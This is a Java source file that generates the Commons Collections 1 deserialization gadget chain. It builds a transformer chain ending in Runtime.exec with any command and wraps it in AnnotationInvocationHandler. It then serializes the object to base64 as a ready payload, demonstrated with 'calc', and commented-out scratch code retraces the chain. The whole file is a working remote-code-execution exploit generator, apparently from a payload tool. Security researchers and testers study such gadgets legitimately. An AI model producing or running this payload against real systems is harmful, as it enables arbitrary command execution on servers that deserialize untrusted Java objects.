package org.hasret.webserigen.payloads;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

//这是 checksetvalue这一条 cc0

public class CommonsCollections1  {

    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException {
        final String[] execArgs = new String[]{cmd};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);

        HashMap<Object,Object> map = new HashMap();
        map.put("value","double");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstrutor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstrutor.setAccessible(true);
        Object o = annotationInvocationhdlConstrutor.newInstance(Target.class,transformedMap);

        String b64Payload = serializeBytesToB64(o);
        return b64Payload;
    }


    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        String s = generatePayload("calc");
//          Runtime r = Runtime.getRuntime();
//          //new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"}).transform(r);
//        InvokerTransformer invokertrans1former = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object,Object> map = new HashMap();
//        map.put("key","value");
//        Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, invokertransformer);
//
////        for (Map.Entry entry: transformedmap.entrySet()){
////            entry.setValue(r);
////        }

        //Class c = Runtime.class;
        //Method getRuntime = c.getDeclaredMethod("getRuntime", null);
    //    Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        //Runtime r = (Runtime) getRuntime.invoke(null,null);
    //    Method invokeMethod = (Method) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
        //Method execmethod = c.getDeclaredMethod("exec", new Class[]{String.class, String.class});
    //    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(invokeMethod);
//        execmethod.setAccessible(true);
//        execmethod.invoke(r,"calc");


//        String[] cmd = new String[]{"calc"};
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, cmd)
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);
//
//        HashMap<Object,Object> map = new HashMap();
//        map.put("value","double");
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
//
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor annotationInvocationhdlConstrutor = c.getDeclaredConstructor(Class.class, Map.class);
//        annotationInvocationhdlConstrutor.setAccessible(true);
//        Object o = annotationInvocationhdlConstrutor.newInstance(Target.class,transformedMap);
//
//        String b64Payload = serializeBytesToB64(o);
//

    }

    public static String serializeBytesToB64(Object obj) throws IOException {
        try(ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            oos.flush();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }

}
